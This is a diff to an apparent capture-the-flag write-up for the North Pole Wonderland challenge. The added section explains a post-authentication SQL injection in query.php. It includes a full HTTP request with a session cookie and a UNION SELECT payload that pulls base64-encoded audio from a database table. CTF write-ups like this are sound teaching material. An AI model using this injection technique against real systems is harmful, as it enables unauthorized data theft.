@@ -957,7 +957,29 @@ cd analytics.northpolewonderland.com
 git checkout .
 ```
 
-Since I already got the audio file, I stopped further digging into it.
+### post authentication exploit
+
+With the git repo, we can analyze the source code. `query.php`, `db.php` and `sprusage.sql` are of particular interest. In the end, the code is prone to SQLi. You can retrieve the `mp3` file from the `audio` table like so.
+
+```
+POST /query.php HTTP/1.1
+Host: analytics.northpolewonderland.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: https://analytics.northpolewonderland.com/query.php
+Cookie: AUTH=82532b2136348aaa1fa7dd2243da1cc9fb13037c49259e5ed70768d4e9baa1c90b96fde8bea62881fb78b97bc4980553b14348637bec
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 164
+
+date=2017-01-06&type=usage_reports` UNION SELECT id, username, filename, TO_BASE64(mp3), id FROM `audio` # &field%5B%5D=udid&modifier%5B%5D=gt&value%5B%5D=1&save=on
+```
+
+You can `base64 -D` the file afterwards.
 
 > ads.northpolewonderland.com 104.198.221.240
 
